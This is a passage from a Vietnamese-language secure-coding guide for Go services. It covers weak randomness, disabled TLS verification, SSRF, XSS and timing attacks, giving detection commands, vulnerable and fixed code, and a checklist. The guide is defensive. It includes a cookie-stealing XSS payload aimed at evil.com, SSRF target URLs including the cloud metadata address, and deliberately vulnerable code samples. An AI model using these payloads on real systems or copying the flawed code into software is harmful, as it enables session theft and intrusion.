Forge session tokens, OTP, CSRF tokens
```

### 5. Phát hiện

```bash
# Tìm import math/rand
rg -n '"math/rand"' --type go

# Tìm rand.Intn, rand.Int63, rand.Float64 trong security context
rg -n "rand\.Intn\|rand\.Int63\|rand\.Seed\|rand\.New" --type go

# Tìm nơi dùng math/rand để generate token/secret
rg -n "rand\." --type go -B2 | rg -i "token|secret|session|otp|password|nonce|key"

# gosec sẽ phát hiện
gosec -include=G404 ./...
```

### 6. Giải pháp

```go
// BAD: math/rand cho security-sensitive values
import "math/rand"

func generateSessionToken() string {
    // BAD: Predictable PRNG
    rand.Seed(time.Now().UnixNano())
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, 32)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}

func generateOTP() string {
    // BAD: Có thể predict OTP
    rand.Seed(time.Now().UnixNano())
    return fmt.Sprintf("%06d", rand.Intn(1000000))
}

// GOOD: crypto/rand cho tất cả security-sensitive values
import (
    "crypto/rand"
    "encoding/base64"
    "math/big"
)

func generateSessionToken() (string, error) {
    // GOOD: Cryptographically secure random bytes
    bytes := make([]byte, 32)
    if _, err := rand.Read(bytes); err != nil {
        return "", fmt.Errorf("generateSessionToken: %w", err)
    }
    return base64.URLEncoding.EncodeToString(bytes), nil
}

func generateOTP() (string, error) {
    // GOOD: Cryptographically secure OTP
    max := big.NewInt(1000000)
    n, err := rand.Int(rand.Reader, max)
    if err != nil {
        return "", fmt.Errorf("generateOTP: %w", err)
    }
    return fmt.Sprintf("%06d", n.Int64()), nil
}

func generateSecureToken(length int) (string, error) {
    bytes := make([]byte, length)
    if _, err := rand.Read(bytes); err != nil {
        return "", fmt.Errorf("generateSecureToken: %w", err)
    }
    return hex.EncodeToString(bytes), nil
}

// GOOD: Secure random string từ alphabet cụ thể
func generateSecureString(length int, alphabet string) (string, error) {
    result := make([]byte, length)
    alphabetLen := big.NewInt(int64(len(alphabet)))
    for i := range result {
        idx, err := rand.Int(rand.Reader, alphabetLen)
        if err != nil {
            return "", fmt.Errorf("generateSecureString: %w", err)
        }
        result[i] = alphabet[idx.Int64()]
    }
    return string(result), nil
}

// GOOD: math/rand vẫn OK cho non-security purposes
import "math/rand"

func shufflePlaylist(songs []Song) []Song {
    // OK: Shuffle playlist không phải security-critical
    r := rand.New(rand.NewSource(time.Now().UnixNano()))
    result := make([]Song, len(songs))
    copy(result, songs)
    r.Shuffle(len(result), func(i, j int) {
        result[i], result[j] = result[j], result[i]
    })
    return result
}
```

### 7. Phòng ngừa

```bash
# gosec phát hiện math/rand trong security context
gosec -include=G404 ./...
# G404: Insecure random number source (rand)

# Tìm và replace math/rand
rg -n '"math/rand"' --type go -l
# Review từng file, xác định nếu dùng cho security

# Linting rule với custom semgrep
semgrep --config "r/go.lang.security.audit.crypto.math-random" ./...
```

**Quy tắc đơn giản:**
- `math/rand` → chỉ cho simulation, games, shuffle không sensitive
- `crypto/rand` → cho MỌI thứ liên quan đến security: tokens, passwords, OTP, nonces, keys

---

## Pattern 09: TLS InsecureSkipVerify

### 1. Tên
TLS InsecureSkipVerify — Bỏ qua certificate verification

### 2. Phân loại
Security / TLS/SSL

### 3. Mức nghiêm trọng
HIGH 🟠 — Vô hiệu hóa TLS verification cho phép Man-in-the-Middle (MITM) attack. Kẻ tấn công có thể chặn và thay đổi toàn bộ traffic giữa service và target.

### 4. Vấn đề

```
Service A ──────────────────────────────► Service B
              ↕ MITM ↕
    Attacker chặn traffic,
    decrypt, đọc/sửa, re-encrypt
    → Service A không biết
```

Khi `InsecureSkipVerify: true`:
- Không verify certificate của server
- Không check certificate expiry
- Không verify hostname match
- Không check certificate chain
- Bất kỳ certificate nào (kể cả self-signed của attacker) đều được accept

### 5. Phát hiện

```bash
# Tìm InsecureSkipVerify
rg -n "InsecureSkipVerify\s*:\s*true" --type go

# Tìm tls.Config với skip verify
rg -n "tls\.Config\b" --type go -A5 | rg "InsecureSkipVerify"

# Tìm http.Transport custom với TLS config
rg -n "http\.Transport\b" --type go -A10

# gosec
gosec -include=G402 ./...
```

### 6. Giải pháp

```go
// BAD: Bỏ qua TLS verification hoàn toàn
import "crypto/tls"

func createInsecureClient() *http.Client {
    // BAD: MITM attack có thể xảy ra
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true, // NEVER dùng trong production
        },
    }
    return &http.Client{Transport: tr}
}

// GOOD: TLS verification đúng cách
func createSecureClient() *http.Client {
    // Default http.Client đã verify TLS certificate
    return &http.Client{
        Timeout: 30 * time.Second,
    }
}

// GOOD: Nếu cần custom TLS (vd: internal CA, mutual TLS)
func createClientWithCustomCA(caCertPath string) (*http.Client, error) {
    caCert, err := os.ReadFile(caCertPath)
    if err != nil {
        return nil, fmt.Errorf("read CA cert: %w", err)
    }

    caCertPool := x509.NewCertPool()
    if !caCertPool.AppendCertsFromPEM(caCert) {
        return nil, errors.New("failed to parse CA certificate")
    }

    tlsConfig := &tls.Config{
        RootCAs: caCertPool,
        // InsecureSkipVerify: false (default, KHÔNG set true)
        MinVersion: tls.VersionTLS12, // Minimum TLS 1.2
    }

    tr := &http.Transport{
        TLSClientConfig: tlsConfig,
    }

    return &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,
    }, nil
}

// GOOD: Mutual TLS (mTLS) cho service-to-service
func createMTLSClient(certFile, keyFile, caFile string) (*http.Client, error) {
    cert, err := tls.LoadX509KeyPair(certFile, keyFile)
    if err != nil {
        return nil, fmt.Errorf("load client cert: %w", err)
    }

    caCert, err := os.ReadFile(caFile)
    if err != nil {
        return nil, fmt.Errorf("read CA: %w", err)
    }

    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)

    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{cert},
        RootCAs:      caCertPool,
        MinVersion:   tls.VersionTLS13, // TLS 1.3 cho internal services
    }

    return &http.Client{
        Transport: &http.Transport{TLSClientConfig: tlsConfig},
        Timeout:   30 * time.Second,
    }, nil
}

// Development: Self-signed certificate đúng cách
// KHÔNG dùng InsecureSkipVerify, thay vào đó add self-signed cert vào trust store
// hoặc dùng mkcert để generate locally-trusted certs
// mkcert localhost 127.0.0.1 ::1
```

### 7. Phòng ngừa

```bash
# gosec
gosec -include=G402 ./...
# G402: TLS InsecureSkipVerify set true

# Tìm và audit tất cả TLS configs
rg -n "tls\.Config\b" --type go -l

# Test TLS configuration
openssl s_client -connect api.myapp.com:443 -verify 5

# Testssl.sh cho comprehensive TLS audit
testssl.sh api.myapp.com
```

**Ngoại lệ hợp lý:** KHÔNG có ngoại lệ nào trong production. Trong development, dùng `mkcert` hoặc `cfssl` để generate locally-trusted certs thay vì skip verification.

---

## Pattern 10: SSRF Qua HTTP Redirect

### 1. Tên
Server-Side Request Forgery (SSRF) qua HTTP Redirect

### 2. Phân loại
Security / Server-Side Request Forgery

### 3. Mức nghiêm trọng
HIGH 🟠 — Kẻ tấn công có thể dùng server làm proxy để access internal services (metadata API, internal databases, internal APIs không expose ra ngoài).

### 4. Vấn đề

```
Attacker ──► POST /webhook {url: "http://169.254.169.254/latest/meta-data/"}
                                │
                                ▼
                    Server fetch URL ──► AWS Metadata API
                                │
                                ▼
                    IAM credentials, instance info
                    → Full AWS account compromise

Hoặc:
url: "http://internal-admin.mycompany.local/admin"
url: "http://redis:6379/"  (protocol smuggling)
url: "http://localhost:8080/admin/delete-all"
```

### 5. Phát hiện

```bash
# Tìm HTTP client fetch với user-provided URL
rg -n "http\.Get\s*\(.*r\.\|http\.Post\s*\(.*r\." --type go

# Tìm url.Parse với user input
rg -n "url\.Parse\s*\(.*r\.(?:URL|Form|Query)\|url\.Parse\s*\(.*req\." --type go

# Tìm http.Client.Do với dynamic URL
rg -n "client\.Do\s*\(.*req\)|http\.DefaultClient\.Do" --type go -B5

# Tìm webhook handlers
rg -n "webhook|Webhook" --type go -l
```

### 6. Giải pháp

```go
// BAD: SSRF vulnerability
func fetchWebhookBad(w http.ResponseWriter, r *http.Request) {
    url := r.FormValue("url")
    // BAD: Fetch URL do user cung cấp mà không validate
    resp, err := http.Get(url)
    if err != nil {
        http.Error(w, "Failed to fetch", 500)
        return
    }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}

// BAD: Không block redirect đến internal addresses
func fetchWithRedirectBad(url string) (*http.Response, error) {
    // BAD: Default client follow redirect không giới hạn
    return http.Get(url)
}

// GOOD: Validate URL và block internal addresses
import "net"

var blockedCIDRs []*net.IPNet

func init() {
    blocked := []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "169.254.0.0/16",   // Link-local (AWS metadata)
        "::1/128",           // IPv6 loopback
        "fc00::/7",          // IPv6 private
    }
    for _, cidr := range blocked {
        _, network, _ := net.ParseCIDR(cidr)
        blockedCIDRs = append(blockedCIDRs, network)
    }
}

func isInternalAddress(host string) bool {
    ips, err := net.LookupHost(host)
    if err != nil {
        return true // Fail safe: block nếu không resolve được
    }
    for _, ipStr := range ips {
        ip := net.ParseIP(ipStr)
        if ip == nil {
            return true
        }
        for _, cidr := range blockedCIDRs {
            if cidr.Contains(ip) {
                return true
            }
        }
    }
    return false
}

func validateWebhookURL(rawURL string) error {
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }

    // Chỉ allow HTTP/HTTPS
    if parsed.Scheme != "https" && parsed.Scheme != "http" {
        return errors.New("only http/https URLs allowed")
    }

    // Production: chỉ allow HTTPS
    if os.Getenv("ENV") == "production" && parsed.Scheme != "https" {
        return errors.New("only https URLs allowed in production")
    }

    // Check hostname không phải internal
    host := parsed.Hostname()
    if isInternalAddress(host) {
        return errors.New("internal addresses not allowed")
    }

    return nil
}

// GOOD: HTTP client không follow redirect đến internal
func createSSRFSafeClient() *http.Client {
    return &http.Client{
        Timeout: 10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            // Validate mỗi redirect destination
            if err := validateWebhookURL(req.URL.String()); err != nil {
                return fmt.Errorf("redirect blocked: %w", err)
            }
            if len(via) >= 3 {
                return errors.New("too many redirects")
            }
            return nil
        },
        // Custom dialer để block internal IP khi connect
        Transport: &http.Transport{
            DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
                host, _, _ := net.SplitHostPort(addr)
                if isInternalAddress(host) {
                    return nil, fmt.Errorf("connection to internal address blocked: %s", host)
                }
                return (&net.Dialer{}).DialContext(ctx, network, addr)
            },
        },
    }
}

func fetchWebhookGood(w http.ResponseWriter, r *http.Request) {
    webhookURL := r.FormValue("url")

    if err := validateWebhookURL(webhookURL); err != nil {
        http.Error(w, "Invalid webhook URL: "+err.Error(), http.StatusBadRequest)
        return
    }

    client := createSSRFSafeClient()
    resp, err := client.Get(webhookURL)
    if err != nil {
        http.Error(w, "Failed to fetch webhook", http.StatusBadGateway)
        return
    }
    defer resp.Body.Close()

    // Limit response size
    limited := io.LimitReader(resp.Body, 1<<20) // 1MB limit
    io.Copy(w, limited)
}
```

### 7. Phòng ngừa

```bash
# gosec
gosec -include=G107 ./...
# G107: Url provided to HTTP request as taint input

# Semgrep SSRF rules
semgrep --config "r/go.lang.security.audit.net.ssrf" ./...

# Test SSRF với Burp Suite hoặc manual
# Try: http://169.254.169.254/
# Try: http://localhost:8080/admin
# Try: http://[::1]/internal
```

---

## Pattern 11: Unsafe HTML Template

### 1. Tên
Cross-Site Scripting (XSS) qua Unsafe HTML Template

### 2. Phân loại
Security / XSS

### 3. Mức nghiêm trọng
CRITICAL 🔴 — XSS cho phép kẻ tấn công thực thi JavaScript tùy ý trong browser của nạn nhân: đánh cắp session cookies, credentials, thực hiện actions thay nạn nhân.

### 4. Vấn đề

```
User input: <script>fetch('https://evil.com?c='+document.cookie)</script>
                │
                ▼
Server dùng fmt.Fprintf hoặc text/template ──► Render HTML không escape
                │
                ▼
Browser thực thi script ──► Cookie bị đánh cắp
```

**Các điểm XSS phổ biến trong Go:**
- `fmt.Fprintf(w, "<div>%s</div>", userInput)`
- `text/template` thay vì `html/template`
- `template.HTML(userInput)` bypass escape
- `template.JS(userInput)` bypass escape
- `template.URL(userInput)` bypass escape

### 5. Phát hiện

```bash
# Tìm fmt.Fprintf với user input vào HTML response
rg -n "fmt\.Fprintf\s*\(w," --type go

# Tìm template.HTML, template.JS cast (bypass escape)
rg -n "template\.HTML\s*\(|template\.JS\s*\(|template\.URL\s*\(" --type go

# Tìm w.Write với string concat
rg -n "w\.Write\s*\(\[\]byte\s*\(" --type go -A2

# Tìm text/template import trong web handlers
rg -n '"text/template"' --type go

# Tìm unsafe response writers
rg -n "io\.WriteString\s*\(w,\|fmt\.Fprintln\s*\(w," --type go
```

### 6. Giải pháp

```go
// BAD: XSS vulnerability
func handleProfile(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    // BAD: Inject user input trực tiếp vào HTML
    fmt.Fprintf(w, "<html><body><h1>Hello, %s!</h1></body></html>", name)
}

func handleCommentBad(w http.ResponseWriter, r *http.Request) {
    comment := getCommentFromDB(r.URL.Query().Get("id"))
    // BAD: text/template không escape HTML
    import "text/template"
    tmpl := template.Must(template.New("").Parse(`<div>{{.Comment}}</div>`))
    tmpl.Execute(w, map[string]string{"Comment": comment})
}

// BAD: Bypass html/template escaping
func renderRawHTML(w http.ResponseWriter, r *http.Request) {
    import "html/template"
    userContent := r.FormValue("content")
    tmpl := template.Must(template.New("").Parse(`<div>{{.}}</div>`))
    // BAD: template.HTML bypass escaping → XSS
    tmpl.Execute(w, template.HTML(userContent))
}

// GOOD: html/template tự động escape
import "html/template"

var profileTemplate = template.Must(template.New("profile").Parse(`
<!DOCTYPE html>
<html>
<head><title>Profile</title></head>
<body>
    <h1>Hello, {{.Name}}!</h1>
    <p>Comment: {{.Comment}}</p>
</body>
</html>
`))

type ProfileData struct {
    Name    string
    Comment string
}

func handleProfileGood(w http.ResponseWriter, r *http.Request) {
    data := ProfileData{
        Name:    r.URL.Query().Get("name"),    // html/template tự escape
        Comment: getCommentFromDB(r.URL.Query().Get("id")),
    }
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    // Header bảo vệ bổ sung
    w.Header().Set("X-Content-Type-Options", "nosniff")
    w.Header().Set("X-Frame-Options", "DENY")
    w.Header().Set("Content-Security-Policy", "default-src 'self'")

    if err := profileTemplate.Execute(w, data); err != nil {
        log.Printf("template error: %v", err)
        http.Error(w, "Internal server error", 500)
    }
}

// GOOD: JSON API thay vì HTML rendering (tránh XSS hoàn toàn)
func handleProfileJSON(w http.ResponseWriter, r *http.Request) {
    data := map[string]string{
        "name":    r.URL.Query().Get("name"),
        "comment": getCommentFromDB(r.URL.Query().Get("id")),
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(data)
    // Frontend React/Vue tự handle rendering an toàn
}

// GOOD: Sanitize HTML nếu cần render rich content (WYSIWYG)
import "github.com/microcosm-cc/bluemonday"

var htmlPolicy = bluemonday.UGCPolicy() // User Generated Content policy

func renderSafeHTML(userHTML string) string {
    // Sanitize HTML, chỉ giữ safe tags
    return htmlPolicy.Sanitize(userHTML)
}
```

### 7. Phòng ngừa

```bash
# gosec
gosec -include=G203 ./...
# G203: Use of unescaped data in HTML templates

# Semgrep XSS rules
semgrep --config "r/go.lang.security.audit.xss" ./...

# Test XSS với payloads
# Try: <script>alert(1)</script>
# Try: <img src=x onerror=alert(1)>
# Try: javascript:alert(1)
# Try: "><script>alert(1)</script>

# Content Security Policy header để mitigate
# Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Headers bảo vệ bổ sung:**
```go
func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        w.Header().Set("Content-Security-Policy", "default-src 'self'")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        next.ServeHTTP(w, r)
    })
}
```

---

## Pattern 12: Timing Side-Channel (Constant-Time Compare)

### 1. Tên
Timing Side-Channel Attack — So sánh chuỗi không constant-time

### 2. Phân loại
Security / Cryptographic Attack

### 3. Mức nghiêm trọng
HIGH 🟠 — Kẻ tấn công có thể brute-force API keys, tokens, HMAC signatures bằng cách đo thời gian response. Đặc biệt nguy hiểm khi so sánh qua network với high-resolution timing.

### 4. Vấn đề

```
So sánh từng byte, dừng sớm khi sai:

Token: "secret123"
Guess: "aaaaaaaa"  → fail ở byte 0 → thời gian: 1ns
Guess: "saaaaaaa"  → fail ở byte 1 → thời gian: 2ns
Guess: "seaaaaaa"  → fail ở byte 2 → thời gian: 3ns
...
Guess: "secret12a" → fail ở byte 8 → thời gian: 9ns

Kẻ tấn công đo timing → biết từng byte đúng
```

**Real-world impact:** Với nhiều request và statistical analysis, timing attack có thể recover HMAC signatures qua internet (nghiên cứu 2009 bởi Crosby, Wallach, Rubin).

### 5. Phát hiện

```bash
# Tìm == comparison với tokens, secrets, passwords
rg -n '==\s*"[^"]*"\|token\s*==\s*\|secret\s*==\s*\|apiKey\s*==\s*' --type go

# Tìm strings.Compare hoặc bytes.Compare trong auth context
rg -n "strings\.Compare\|bytes\.Compare" --type go -B3

# Tìm string equality check trong middleware/auth
rg -n '(?:token|key|secret|hash|sig|signature|hmac)\s*==\s*\w' --type go -i

# Tìm thiếu hmac.Equal
rg -n "hmac\b" --type go | rg -v "hmac\.Equal\|crypto/hmac"
```

### 6. Giải pháp

```go
// BAD: Timing-vulnerable comparisons
func validateAPIKeyBad(provided, stored string) bool {
    // BAD: string == có thể leak timing info
    return provided == stored
}

func validateTokenBad(token string) bool {
    expected := computeExpectedToken()
    // BAD: bytes.Equal dừng sớm khi tìm thấy mismatch
    return bytes.Equal([]byte(token), []byte(expected))
}

func validateHMACBad(message, signature string, key []byte) bool {
    mac := hmac.New(sha256.New, key)
    mac.Write([]byte(message))
    expected := mac.Sum(nil)
    // BAD: Timing attack khi compare HMAC
    return hex.EncodeToString(expected) == signature
}

// GOOD: crypto/subtle.ConstantTimeCompare
import "crypto/subtle"

func validateAPIKeyGood(provided, stored string) bool {
    // GOOD: Constant-time comparison, không leak timing info
    // Chú ý: ConstantTimeCompare cũng leak LENGTH nếu khác length
    // Do đó cần ensure cùng length trước
    if len(provided) != len(stored) {
        // Vẫn chạy comparison để tránh early exit timing
        // Nhưng trả về false
        subtle.ConstantTimeCompare([]byte(provided), []byte(stored))
        return false
    }
    return subtle.ConstantTimeCompare([]byte(provided), []byte(stored)) == 1
}

func validateTokenGood(token string) bool {
    expected := computeExpectedToken()
    return subtle.ConstantTimeCompare([]byte(token), []byte(expected)) == 1
}

// GOOD: Validate HMAC signature đúng cách
func validateHMACGood(message []byte, providedSig string, key []byte) bool {
    mac := hmac.New(sha256.New, key)
    mac.Write(message)
    expectedSig := mac.Sum(nil)

    providedBytes, err := hex.DecodeString(providedSig)
    if err != nil {
        return false
    }

    // GOOD: hmac.Equal là constant-time compare
    return hmac.Equal(providedBytes, expectedSig)
}

// GOOD: Webhook signature validation (GitHub style)
func validateWebhookSignature(payload []byte, signature, secret string) bool {
    if !strings.HasPrefix(signature, "sha256=") {
        return false
    }

    mac := hmac.New(sha256.New, []byte(secret))
    mac.Write(payload)
    expected := "sha256=" + hex.EncodeToString(mac.Sum(nil))

    // GOOD: Constant-time compare
    return subtle.ConstantTimeCompare([]byte(signature), []byte(expected)) == 1
}

// GOOD: Password verification (dùng bcrypt/argon2 đã built-in constant-time)
import "golang.org/x/crypto/bcrypt"

func verifyPassword(hash, password string) bool {
    // GOOD: bcrypt.CompareHashAndPassword đã là constant-time
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

// GOOD: Argon2 verification (modern, recommended)
import "golang.org/x/crypto/argon2"

func verifyPasswordArgon2(encoded, password string) bool {
    // Parse encoded hash, extract salt, params
    hash, salt, params, err := parseArgon2Hash(encoded)
    if err != nil {
        return false
    }
    // Compute hash với same params
    computed := argon2.IDKey([]byte(password), salt, params.time, params.memory, params.threads, params.keyLen)
    // GOOD: subtle.ConstantTimeCompare
    return subtle.ConstantTimeCompare(hash, computed) == 1
}
```

### 7. Phòng ngừa

```bash
# gosec
gosec -include=G401,G501,G502,G503,G504,G505 ./...

# Tìm == comparison trong auth functions
rg -n "==" --type go -B5 | rg -i "token\|key\|secret\|password\|hash"

# Semgrep timing attack rules
semgrep --config "r/go.lang.security.audit.crypto.timing" ./...

# Kiểm tra nếu dùng hmac.Equal thay vì ==
rg -n "hmac\b" --type go -A2 | rg -v "hmac\.Equal\|hmac\.New"
```

**Quy tắc constant-time:**
| So sánh | BAD | GOOD |
|---------|-----|------|
| String/byte | `==`, `strings.Compare` | `subtle.ConstantTimeCompare` |
| HMAC | `==` | `hmac.Equal` |
| Password | `==` | `bcrypt.CompareHashAndPassword` |
| Số nguyên | `!=` (trong auth) | `subtle.ConstantTimeEq` |

---

## Tổng Kết: Security Checklist cho Go Services

```
[ ] SQL queries dùng parameterized statements (không fmt.Sprintf)
[ ] Templates dùng html/template (không text/template)
[ ] JWT validate algorithm + exp + iss + aud
[ ] CORS dùng allowlist (không reflect origin, không wildcard+credentials)
[ ] Secrets load từ env vars hoặc secret manager (không hardcode)
[ ] File paths được validate và constrained trong base directory
[ ] Auth checks atomic (database transactions, mutex locks)
[ ] Random values cho security dùng crypto/rand (không math/rand)
[ ] TLS certificates được verify (InsecureSkipVerify = false)
[ ] User-provided URLs validated và không route đến internal addresses
[ ] HTML output dùng html/template escape (không fmt.Fprintf raw HTML)
[ ] Secret/token comparison dùng constant-time (subtle.ConstantTimeCompare)
```

### Tools Chạy Trong CI/CD

```bash
# Chạy tất cả security checks
gosec ./...                          # Static analysis security
go test -race ./...                  # Race condition detection
govulncheck ./...                    # Known vulnerabilities
staticcheck ./...                    # Additional static analysis
semgrep --config=p/golang-security . # Semgrep security rules
gitleaks protect --staged            # Detect secrets before commit
```
